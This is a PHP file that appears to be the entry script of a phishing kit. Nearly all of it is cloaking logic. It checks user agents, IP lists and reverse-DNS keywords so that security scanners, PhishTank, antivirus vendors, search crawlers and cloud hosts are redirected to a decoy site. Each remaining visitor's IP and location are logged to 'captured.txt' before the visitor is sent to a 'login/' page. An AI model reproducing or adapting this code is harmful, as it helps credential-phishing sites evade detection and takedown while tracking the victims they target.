<?php
session_start();

	include "Greybots/Bad_ip.php";
	include "Greybots/Grey-Bot-1.php";
	include "Greybots/Grey-Bot-2.php";
	include "Greybots/Grey-Bot-3.php";
	include "Greybots/Grey-Bot-4.php";
	include "Greybots/Grey-Bot-5.php";
	include "Greybots/Grey-Bot-6.php";
	include "Greybots/Grey-Bot-7.php";
	include "Greybots/Grey-Bot-8.php";
	include "Greybots/Grey-Bot-9.php";
	include "Greybots/Grey-Bot-10.php";
	include "Greybots/Grey-Bot-11.php";
	include "Greybots/Grey-Bot-12.php";
	include "Greybots/Grey-Bot-Crawler.php";
	include "Greybots/Grey-IP-BlackList.php";
	include "Greybots/Grey-Phishingtank.php";
	include "Greybots/Grey-antibot-phishtank.php";
	include "Greybots/Grey-Proxyblock.php";
	include "Greybots/Grey-userAgent-1.php";
	include "Greybots/Grey-userAgent-2.php";
	include "Greybots/Grey-antibot-host.php";
	include "Greybots/Grey-antibot-ip.php";
	include "Greybots/Grey-antibot-proxy.php";
	include "Greybots/Grey-Blocker.php";
	include "Greybots/Grey-Bot.php";

	if(strpos($_SERVER['HTTP_USER_AGENT'], 'google')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Java')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) {

						$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
				$save=fopen("bots.txt","a+");
				fwrite($save,$content);
				fclose($save);
			header("Location: https://www.superhonda.com/");
			exit();

	}

	if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {

				$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
				$save=fopen("bots.txt","a+");
				fwrite($save,$content);
				fclose($save);
			header("Location: https://www.superhonda.com/");
			exit();

		}

	$BotSp0x = array("abot","dbot","ebot","hbot","kbot","lbot","mbot","nbot","obot","pbot","rbot","sbot","tbot","vbot","ybot","zbot","bot.","bot/","_bot",".bot","/bot","-bot",":bot","(bot","crawl","slurp","spider","seek","accoona","acoon","adressendeutschland","ah-ha.com","ahoy","altavista","ananzi","anthill","appie","arachnophilia","arale","araneo","aranha","architext","aretha","arks","asterias","atlocal","atn","atomz","augurfind","backrub","bannana_bot","baypup","bdfetch","bigbrother","biglotron","bjaaland","blackwidow","blaiz","blog","blo.","bloodhound","boitho","booch","bradley","butterfly","calif","cassandra","ccubee","cfetch","charlotte","churl","cienciaficcion","cmc","collective","comagent","combine","computingsite","csci","curl","cusco","daumoa","deepindex","delorie","depspid","deweb","dieblindekuh","digger","ditto","dmoz","docomo","downloadexpress","dtaagent","dwcp","ebiness","ebingbong","e-collector","ejupiter","emacs-w3searchengine","esther","evliyacelebi","ezresult","falcon","felixide","ferret","fetchrover","fido","findlinks","fireball","fishsearch","fouineur","funnelweb","gazz","gcreep","genieknows","getterroboplus","geturl","glx","goforit","golem","grabber","grapnel","gralon","griffon","gromit","grub","gulliver","hamahakki","harvest","havindex","helix","heritrix","hkuwwwoctopus","homerweb","htdig","htmlindex","html_analyzer","htmlgobble","hubater","hyper-decontextualizer","ia_archiver","ibm_planetwide","ichiro","iconsurf","iltrovatore","image.kapsi.net","imagelock","incywincy","indexer","infobee","informant","ingrid","inktomisearch.com","inspectorweb","intelliagent","internetshinchakubin","ip3000","iron33","israeli-search","ivia","jack","jakarta","javabee","jetbot","jumpstation","katipo","kdd-explorer","kilroy","knowledge","kototoi","kretrieve","labelgrabber","lachesis","larbin","legs","libwww","linkalarm","linkvalidator","linkscan","lockon","lwp","lycos","magpie","mantraagent","mapoftheinternet","marvin/","mattie","mediafox","mediapartners","mercator","merzscope","microsofturlcontrol","minirank","miva","mj12","mnogosearch","moget","monster","moose","motor","multitext","muncher","muscatferret","mwd.search","myweb","najdi","nameprotect","nationaldirectory","nazilla","ncsabeta","nec-meshexplorer","nederland.zoek","netcartawebmapengine","netmechanic","netresearchserver","netscoop","newscan-online","nhse","nokia6682/","nomad","noyona","siteexplorer","nutch","nzexplorer","objectssearch","occam","omni","opentext","openfind","openintelligencedata","orbsearch","osis-project","packrat","pageboy","pagebull","page_verifier","panscient","parasite","partnersite","patric","pear.","pegasus","peregrinator","pgpkeyagent","phantom","phpdig","picosearch","piltdownman","pimptrain","pinpoint","pioneer","piranha","plumtreewebaccessor","pogodak","poirot","pompos","poppelsdorf","poppi","populariconoclast","psycheclone","publisher","python","rambler","ravensearch","roach","roadrunner","roadhouse","robbie","robofox","robozilla","rules","salty","sbider","scooter","scoutjet","scrubby","search.","searchprocess","semanticdiscovery","senrigan","sg-scout","shai'hulud","shark","shopwiki","sidewinder","sift","silk","simmany","sitesearcher","sitevalet","sitetech-rover","skymob.com","sleek","smartwit","sna-","snappy","snooper","sohu","speedfind","sphere","sphider","spinner","spyder","steeler/","suke","suntek","supersnooper","surfnomore","sven","sygol","szukacz","tachblackwidow","tarantula","templeton","/teoma","t-h-u-n-d-e-r-s-t-o-n-e","theophrastus","titan","titin","tkwww","toutatis","t-rex","tutorgig","twiceler","twisted","ucsd","udmsearch","urlcheck","updated","vagabondo","valkyrie","verticrawl","victoria","vision-search","volcano","voyager/","voyager-hc","w3c_validator","w3m2","w3mir","walker","wallpaper","wanderer","wauuu","wavefire","webcore","webhopper","webwombat","webbandit","webcatcher","webcopy","webfoot","weblayers","weblinker","weblogmonitor","webmirror","webmonkey","webquest","webreaper","websitepulse","websnarf","webstolperer","webvac","webwalk","webwatch","webwombat","webzinger","wget","whizbang","whowhere","wildferret","worldlight","wwwc","wwwster","xenu","xget","xift","xirq","yandex","yanga","yeti","yodao","zao/","zippp","zyborg","proximic","Googlebot","Baiduspider","Cliqzbot","A6-Indexer","AhrefsBot","Genieo","BomboraBot","CCBot","URLAppendBot","DomainAppender","msnbot-media","Antivirus","YoudaoBot","MJ12bot","linkdexbot","Go-http-client",	"Googlebot","Baiduspider","PhantomJS","applebot","metauri.com","Twitterbot","ia_archiver","R6_FeedFetcher","NetcraftSurveyAgent","Sogouwebspider","bingbot","Yahoo!Slurp","facebookexternalhit","PrintfulBot","msnbot","Twitterbot","UnwindFetchor","urlresolver","Butterfly","TweetmemeBot","PaperLiBot","MJ12bot","AhrefsBot","Exabot","Ezooms","YandexBot","SearchmetricsBot","picsearch","TweetedTimesBot","QuerySeekerSpider","ShowyouBot","woriobot","merlinkbot","BazQuxBot","Kraken","SISTRIXCrawler","R6_CommentReader","magpie-crawler","GrapeshotCrawler","PercolateCrawler","MaxPointCrawler","R6_FeedFetcher","NetSeercrawler","grokkit-crawler","SMXCrawler","PulseCrawler","Y!J-BRW","80legs.com/webcrawler","Mediapartners-Google","Spinn3r","InAGist","Python-urllib","NING","TencentTraveler","Feedfetcher-Google","mon.itor.us","spbot","Feedly","bot","java","curl","spider","crawler");

	 if(in_array($_SERVER['REMOTE_ADDR'],$BotSp0x)) {
				$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
				$save=fopen("bots.txt","a+");
				fwrite($save,$content);
				fclose($save);
			header("Location: https://www.superhonda.com/");
			exit();

	}
		if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
				$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Phishtank ] \r\n";
				$save=fopen("bots.txt","a+");
				fwrite($save,$content);
				fclose($save);
			header("Location: https://www.superhonda.com/");
			exit();

		}
		}

		if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
				$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Phishtank ] \r\n";
				$save=fopen("bots.txt","a+");
				fwrite($save,$content);
				fclose($save);
			header("Location: https://www.superhonda.com/");
			exit();

		}
		}

	### Check if the ip between 146.112.0.0 And 146.112.255.255 ###
	$range_start = ip2long("146.112.0.0");
	$range_end   = ip2long("146.112.255.255");
	$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

	 if ($ip2long >= $range_start && $ip2long <= $range_end){
			$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Blacklist ] \r\n";
				$save=fopen("bots.txt","a+");
				fwrite($save,$content);
				fclose($save);
			header("Location: https://www.superhonda.com/");
			exit();

	 }



	$Grey_IP = $_SERVER['REMOTE_ADDR'];
	$Grey_Band = array(
	"^81.161.59.*","^66.135.200.*","^91.103.66.*","^208.91.115.*","^199.30.228.*","^66.102.*.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^208.65.144.*","^209.85.128.*","^216.239.32.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*","54.228.218.117","^54.228.218.*","185.28.20.243","^185.28.20.*","217.16.26.166","^217.16.26.*","50.16.241.113","50.16.241.114","50.16.241.117","50.16.247.234","52.204.97.54","52.5.190.19","54.197.234.188","54.208.100.253","23.21.227.69","65.214.45.143","65.214.45.148","66.235.124.192","66.235.124.7","66.235.124.101","66.235.124.193","66.235.124.73","66.235.124.196","66.235.124.74","63.123.238.8","202.143.148.61","66.249.66.1","1.9.2.13","1.9.2.15","62.210.13.58","104.62.2.60","104.83.233.198","107.178.194.64","108.161.29.60","115.238.55.18","119.97.214.138","138.197.207.*","145.239.156.71","145.239.156.89","150.70.168.35","150.70.188.167","154.127.57.30","162.243.128.197","162.243.187.126","162.243.69.215","165.227.0.128","170.250.139.48","138.197.207.147","173.230.147.44","177.39.232.144","178.17.170.156","185.104.186.168","185.220.101.26","185.28.20.243","188.166.63.71","192.36.27.7","196.52.84.81","204.13.201.137","208.87.233.140","212.83.139.219","212.92.117.5","216.164.117.239","217.16.26.166","217.96.188.74","219.117.238.170","23.27.153.247","23.27.154.37","24.23.24.144","27.0.1453.110","3.0.04506.648","3.0.4506.2152","31.168.158.239","34.237.113.113","39.0.2150.5","41.0.2272.118","43.0.2357.81","44.0.2403.155","46.101.94.163","5.62.39.18","5.62.41.35","5.62.56.91","50.112.194.65","50.116.2.167","51.0.2704.103","52.18.11.161","52.192.164.225","52.27.2.86","52.31.63.97","52.5.98.73","52.72.33.140","52.87.10.90","52.91.94.56","53.0.2785.116","54.213.103.141","54.228.218.117","54.245.191.79","56.0.2924.87","57.0.2987.98","61.0.3116.0","62.24.252.133","62.67.194.35","63.0.3239.132","64.0.3282.140","64.0.3282.167","66.0.3358.0","66.0.3359.0","67.0.3360.0","67.0.3361.0","68.65.53.71","75.163.12.85","76.19.184.88","77.69.251.230","80.104.176.17","81.0.48.*","81.0.48.138","84.13.191.239","84.92.148.184","88.99.62.141","217.96.197.246","89.234.157.254","91.231.212.111","173.239.240.147","103.248.172.42","87.113.96.90","165.227.0.128","185.229.190.140", "165.227.0.128", "46.101.94.163", "165.227.39.194","87.113.96.90","46.101.119.24","82.102.27.75", "173.239.230.97", "82.102.27.75", "87.113.96.90", "46.101.119.24", "173.239.230.97", "87.113.96.90", "87.113.96.90", "159.203.0.156", "162.243.187.126","82.102.27.75", "87.113.96.90","103.248.172.42", "103.248.172.42", "47.30.133.89", "103.248.172.42");

	if(in_array($Grey_IP,$Grey_Band)){
		$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Banned ] \r\n";
				$save=fopen("bots.txt","a+");
				fwrite($save,$content);
				fclose($save);
			header("Location: https://www.superhonda.com/");
		exit();

	 }
	$lp = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
	$Grey_Host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	$Grey_Blocked = array("drweb","Dr.Web","hostinger","scanurl","above","google","facebook","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","msnbot","p3pwgdsn","netcraft","trendmicro","ebay","paypal","torservers","messagelabs","sucuri.net","crawler","googlebot","Googlebot-Video","bingbot","Baiduspider","Baiduspider-mobile","Baiduspider-video","Baiduspider-image","NaverBot","Yeti","Yandex","YandexBot","YandexMobileBot","YandexVideo","YandexWebmaster","YandexSitelinks","SeznamBot","AdsBot-Google","Twitterbot","Adidxbot","externalfacebookhit","Facebot","Yahoo Pipes 1.0","facebookexternalhit","EtaoSpider","amazon","netflix","Slurp","msnbot","Applebot","Googlebot-Image","teoma","ia_archiver","YandexDirect","gsa-crawler","OmniExplorer_Bot","msnbot-mobile","YahooSeeker","SPRO-NET-206-80-96","SPRO-NET-207-70-0","SPRO-NET-209-19-128","LVLT-STATIC-4-14-16","americanexpress","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","paypal");

	 foreach($Grey_Blocked as $Grey_word) {
			 if (substr_count($Grey_Host, $Grey_word) > 0) {
				$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bad word ] \r\n";
				$save=fopen("bots.txt","a+");
				fwrite($save,$content);
				fclose($save);
			header("Location: https://www.superhonda.com/");
		exit();

			}
			}


	$Botname = array( // LIST BOOTS NAME
		"bot","above","google","softlayer","amazonaws","cyveillance","compatible","facebook","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","apache-httpclient","lssrocketcrawler","Trident","X11","Macintosh","crawler","urlredirectresolver","jetbrains","spam","windows95","windows98","acunetix","netsparker","google","007ac9","008","192.comagent","200pleasebot","360spider","4seohuntbot","50.nu","a6-indexer","admantx","amznkassocbot","aboundexbot","aboutusbot","abravespider","accelobot","acoonbot","addthis.com","adsbot-google","ahrefsbot","alexabot","amagit.com","analytics","antbot","apercite","aportworm","arabot","crawl","slurp","spider","seek","accoona","acoon","adressendeutschland","ah-ha.com","ahoy","altavista","ananzi","anthill","appie","arachnophilia","arale","araneo","aranha","architext","aretha","arks","asterias","atlocal","atn","atomz","augurfind","backrub","bannana_bot","baypup","bdfetch","bigbrother","biglotron","bjaaland","blackwidow","blaiz","blog","blo.","bloodhound","boitho","booch","bradley","butterfly","calif","cassandra","ccubee","cfetch","charlotte","churl","cienciaficcion","cmc","collective","comagent","combine","computingsite","csci","curl","cusco","daumoa","deepindex","delorie","depspid","deweb","dieblindekuh","digger","ditto","dmoz","docomo","downloadexpress","dtaagent","dwcp","ebiness","ebingbong","e-collector","ejupiter","emacs-w3searchengine","esther","evliyacelebi","ezresult","falcon","felixide","ferret","fetchrover","fido","findlinks","fireball","fishsearch","fouineur","funnelweb","gazz","gcreep","genieknows","getterroboplus","geturl","glx","goforit","golem","grabber","grapnel","gralon","griffon","gromit","grub","gulliver","hamahakki","harvest","havindex","helix","heritrix","hkuwwwoctopus","homerweb","htdig","htmlindex","html_analyzer","htmlgobble","hubater","hyper-decontextualizer","ia_archiver","ibm_planetwide","ichiro","iconsurf","iltrovatore","image.kapsi.net","imagelock","incywincy","indexer","infobee","informant","ingrid","inktomisearch.com","inspectorweb","intelliagent","internetshinchakubin","ip3000","iron33","israeli-search","ivia","jack","jakarta","javabee","jetbot","jumpstation","katipo","kdd-explorer","kilroy","knowledge","kototoi","kretrieve","labelgrabber","lachesis","larbin","legs","libwww","linkalarm","linkvalidator","linkscan","lockon","lwp","lycos","magpie","mantraagent","mapoftheinternet","marvin/","mattie","mediafox","mediapartners","mercator","merzscope","microsofturlcontrol","minirank","miva","mj12","mnogosearch","moget","monster","moose","motor","multitext","muncher","muscatferret","mwd.search","myweb","najdi","nameprotect","nationaldirectory","nazilla","ncsabeta","nec-meshexplorer","nederland.zoek","netcartawebmapengine","netmechanic","netresearchserver","netscoop","newscan-online","nhse","nokia6682/","nomad","noyona","nutch","nzexplorer","objectssearch","occam","omni","opentext","openfind","openintelligencedata","orbsearch","osis-project","packrat","pageboy","pagebull","page_verifier","panscient","parasite","partnersite","patric","pear.","pegasus","peregrinator","pgpkeyagent","phantom","phpdig","picosearch","piltdownman","pimptrain","pinpoint","pioneer","piranha","plumtreewebaccessor","pogodak","poirot","pompos","poppelsdorf","poppi","populariconoclast","psycheclone","publisher","python","rambler","ravensearch","roach","roadrunner","roadhouse","robbie","robofox","robozilla","rules","salty","sbider","scooter","scoutjet","scrubby","search.","searchprocess","semanticdiscovery","senrigan","sg-scout","shai'hulud","shark","shopwiki","sidewinder","sift","silk","simmany","sitesearcher","sitevalet","sitetech-rover","skymob.com","sleek","smartwit","sna-","snappy","snooper","sohu","speedfind","sphere","sphider","spinner","spyder","steeler/","suke","suntek","supersnooper","surfnomore","sven","sygol","szukacz","tachblackwidow","tarantula","templeton","/teoma","t-h-u-n-d-e-r-s-t-o-n-e","theophrastus","titan","titin","tkwww","toutatis","t-rex","tutorgig","twiceler","twisted","ucsd","udmsearch","urlcheck","updated","vagabondo","valkyrie","verticrawl","victoria","vision-search","volcano","voyager/","voyager-hc","w3c_validator","w3m2","w3mir","walker","wallpaper","wanderer","wauuu","wavefire","webcore","webhopper","webwombat","webbandit","webcatcher","webcopy","webfoot","weblayers","weblinker","weblogmonitor","webmirror","webmonkey","webquest","webreaper","websitepulse","websnarf","webstolperer","webvac","webwalk","webwatch","webwombat","webzinger","wget","whizbang","whowhere","wildferret","worldlight","wwwc","wwwster","xenu","xift","xirq","yandex","yanga","yeti","yahoo!");

	foreach ($Botname as $words) {
				if (stripos($_SERVER['HTTP_USER_AGENT'],$words)){
				 $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
				$save=fopen("bots.txt","a+");
				fwrite($save,$content);
				fclose($save);
			header("Location: https://www.superhonda.com/");
			exit();

			}
		}


	ini_set( "display_errors", 0);

	 $banned_ip_addresses = array('54.68.','64.79.100.23','5.254.97.75','148.251.236.167','88.180.102.124','62.210.172.77','195.206.253.146','164.132.145.','164.132.146.','164.132.147.','164.132.148.','164.132.149.','51.38.247.56','51.38.247.56','51.38.248.','51.38.249.','51.38.250.','51.38.251.','51.38.252.239','35.180.','35.181.','66.102.8.','208.87.237.','205.251.148.','45.89.174.','95.49.231.','80.82.64.','34.70.','34.71.','34.72.','34.73.','34.74.','34.75.','52.250.','52.251.','90.187.238.157','69.25.56.','69.25.57.','69.25.58.','69.25.59.','107.152.186.','38.145.83.','159.89.','209.17.96.','209.17.97.','5.62.41.','192.99.56.','208.87.237.','159.65.210.','198.54.128.146','150.143.151.239','66.101.','66.102.','35.187.132.','204.13.200.','204.13.201.','181.214.182.','104.227.178.','191.101.73.34','45.40.');
	 $banned_bots = array('.ru','AhrefsBot','crawl','crawler','DotBot','linkdex','majestic','meanpath','PageAnalyzer','robot','rogerbot','semalt','SeznamBot','spider','Google','MSN','bing','Slurp','Yahoo','DuckDuck','Googlebot','bot','Bot','Amazonaws','Amazon','amazon','Google','safebrowsing','googlesafebrowing','Fortiguard','Baiduspider','ia_archiver','NetcraftSurveyAgent','Sogouwebspider','bingbot','Yahoo!Slurp','facebookexternalhit','PrintfulBot','msnbot','Twitterbot','UnwindFetchor','urlresolver','Butterfly','TweetmemeBot','PaperLiBot','MJ12bot','AhrefsBot','MicrosoftCorporation','Exabot','Ezooms','YandexBot','SearchmetricsBot','picsearch','TweetedTimesBot','QuerySeekerSpider','ShowyouBot','woriobot','merlinkbot','BazQuxBot','Kraken','SISTRIXCrawler','R6_CommentReader','magpie-crawler','GrapeshotCrawler','PercolateCrawler','MaxPointCrawler','R6_FeedFetcher','NetSeercrawler','grokkit-crawler','SMXCrawler','PulseCrawler','Y!J-BRW','80legs.com/webcrawler','Mediapartners-Google','Spinn3r','InAGist','Python-urllib','NING','TencentTraveler','Feedfetcher-Google','mon.itor.us','spbot','Feedly','bitlybot','ADmantXPlatform','Niki-Bot','feedfetcher','BitDefender','mcafee','antivirus','cloudflare','p3pwgdsn','avg','avira','avast','ovh.net','security','twitter','bitdefender','virustotal','phising','clamav','baidu','safebrowsing','eset','mailshell','azure','miniature','tlh.ro','aruba','dyn.plus.net','pagepeeker','SPRO-NET-207-70-0','SPRO-NET-209-19-128','vultr','colocrossing.com','geosr','drweb','dr.web','linode.com','opendns','cymru.com','sl-reverse.com','surriel.com','hosting','orange-labs','speedtravel','metauri','apple.com','bruuk.sk','sysms.net','oracle','cisco','amuri.net','versanet.de','hilfe-veripayed.com','googlebot.com','upcloud.host','nodemeter.net','e-active.nl','downnotifier','online-domain-tools','fetcher6-2.go.mail.ru','uptimerobot.com','monitis.com','colocrossing.com','majestic12','as9105.com','btcentralplus.com','anonymizing-proxy','digitalcourage.de','triolan.net','staircaseirony','stelkom.net','comrise.ru','kyivstar.net','mpdedicated.com','starnet.md','bc.googleusercontent.com','progtech.ru','hinet.net','is74.ru','shore.net','cyberinfo','ipredator','unknown.telecom.gomel.by','minsktelecom.by','parked.factioninc.com','compute.amazonaws.com','google-proxy','rdns.cloudsystemnetworks.com','ff.avast.com','mailcontrol.com','tor-exit-anonymizer.appliedprivacy.net','dandify.homeconsolidate.com');
	 $banned_unknown_bots = array('bot ','bot_','bot+','bot:','bot,','bot;','bot\\','bot.','bot/','bot-');
	 $good_bots = array('smile');
	 $banned_redirect_url = 'http://english-1329329990.spampoison.com';

	// Visitor's IP address and Browser (User Agent)
	 $ip_address = $_SERVER['REMOTE_ADDR'];
	 $browser = $_SERVER['HTTP_USER_AGENT'];

	// Declared Temporary Variables
	 $ipfound = $piece = $botfound = $gbotfound = $ubotfound = '';

	// Checks for Banned IP Addresses and Bots
	 if($banned_redirect_url != ''){
		 // Checks for Banned IP Address
				if(!empty($banned_ip_addresses)){
					if(in_array($ip_address, $banned_ip_addresses)){$ipfound = 'found';}
					if($ipfound != 'found'){
						$ip_pieces = explode('.', $ip_address);
						foreach ($ip_pieces as $value){
							$piece = $piece.$value.'.';
							if(in_array($piece, $banned_ip_addresses)){$ipfound = 'found'; break;}
						}
					}
					if($ipfound == 'found'){header("location: $banned_redirect_url"); exit();}
				}

		 // Checks for Banned Bots
				if(!empty($banned_bots)){
					foreach ($banned_bots as $bbvalue){
						$pos1 = stripos($browser, $bbvalue);
						if($pos1 !== false){$botfound = 'found'; break;}
					}
					if($botfound == 'found'){header("location: $banned_redirect_url"); exit();}
				}

		 // Checks for Banned Unknown Bots
				if(!empty($good_bots)){
					foreach ($good_bots as $gbvalue){
						$pos2 = stripos($browser, $gbvalue);
						if($pos2 !== false){$gbotfound = 'found'; break;}
					}
				}
				if($gbotfound != 'found'){
					if(!empty($banned_unknown_bots)){
						foreach ($banned_unknown_bots as $bubvalue){
							$pos3 = stripos($browser, $bubvalue);
							if($pos3 !== false){$ubotfound = 'found'; break;}
						}
						if($ubotfound == 'found'){header("location: $banned_redirect_url"); exit();}
					}
				}
	 }

	 ### Perform a HTTP REFERER check on the visitor to see if they are coming from the Phishtank website ###

				if(isset($_SERVER['HTTP_REFERER'])) {
				 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
						$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Phishtank ] \r\n";
						$save=fopen("phistank.txt","a+");
						fwrite($save,$content);
						fclose($save);
						header("Location: https://www.superhonda.com/");
			exit();

				}
				}

				if(isset($_SERVER['HTTP_REFERER'])) {
				 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
						$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Phishtank ] \r\n";
						$save=fopen("phistank.txt","a+");
						fwrite($save,$content);
						fclose($save);
						header("Location: https://www.superhonda.com/");
			exit();

				}
				}

		if(isset($_SERVER['HTTP_REFERER'])) {
				 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.urlscan.io') {
						$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Phishtank ] \r\n";
						$save=fopen("phistank.txt","a+");
						fwrite($save,$content);
						fclose($save);
						header("Location: https://www.superhonda.com/");
			exit();

				}
				}


	$Grey_ip = getenv("REMOTE_ADDR");
	$url = "http://www.geoplugin.net/json.gp?ip=".$Grey_ip;
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$resp=curl_exec($ch);
	curl_close($ch);
	$details = json_decode($resp, true);
	$Grey_countrycode = $details['geoplugin_countryCode'];
	$Grey_country = $details['geoplugin_countryName'];
	$Grey_city = $details['geoplugin_city'];
	$Grey_state = $details['geoplugin_timezone'];
	$Grey_currency = $details['geoplugin_currencyCode'];

	$myfile = fopen("captured.txt", "a+");
	$txt = $Grey_ip. "\n". $Grey_countrycode. "\n". $Grey_country. "\n". $Grey_city. "\n". $Grey_state. "\n". $Grey_currency. "\n\n\n\n"  ;
	fwrite($myfile, $txt);
	fclose($myfile);
	    header( 'Location: login/' );


?>
